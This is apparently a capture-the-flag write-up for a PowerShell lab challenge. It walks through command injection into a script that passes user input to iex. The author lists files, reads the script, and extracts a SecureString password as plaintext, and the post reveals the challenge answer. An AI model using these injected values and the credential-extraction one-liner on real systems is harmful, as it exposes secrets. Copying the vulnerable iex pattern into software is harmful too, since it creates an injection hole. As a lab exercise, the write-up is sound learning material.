---
layout: default
title: Powershell-SecureString
---
Again, like before, I inject some code using `; cmd`:

```powershell
> ;dir
Connect to the database With the secure Password: System.Security.SecureString. Backup the table
-a----       12/12/2021   9:25 AM             43 .git
-a----       10/29/2020   9:27 AM            361 .passwd.crypt
------       12/12/2021   9:50 AM            748 ._perms
-a----       10/29/2020   9:23 AM            176 AES.key
-a----       10/29/2020   9:30 AM            331 ch19.ps1
Table to dump:
```

We can see the password is encrypted, let's read the script:

```powershell
> ; cat ch19.ps1
Connect to the database With the secure Password: System.Security.SecureString. Backup the table

$KeyFile = "AES.key"
$key = Get-Content $KeyFile
$SecurePassword = Get-Content .passwd.crypt | x -key $Key

while($true){
        Write-Host "Table to dump:"
        Write-Host -NoNewLine "> "
        $table=Read-Host

        iex "Write-Host Connect to the database With the secure Password: $SecurePassword. Backup the table $table"
}
```

We can see it saves the password inside the `$SecurePassword` object.

I googled, and found this [https://stackoverflow.com/a/40166959](https://stackoverflow.com/a/40166959) response, that talks about how to obtain the plaintext out of the secure string.
```powershell
(New-Object PSCredential 0, $SecurePassword).GetNetworkCredential().Password
```

Let's use it:
```powershell
> ;(New-Object PSCredential 0, $SecurePassword).GetNetworkCredential().Password
Connect to the database With the secure Password: System.Security.SecureString. Backup the table
SecureStringBypass
Table to dump:
```

So, the password is **SecureStringBypass**
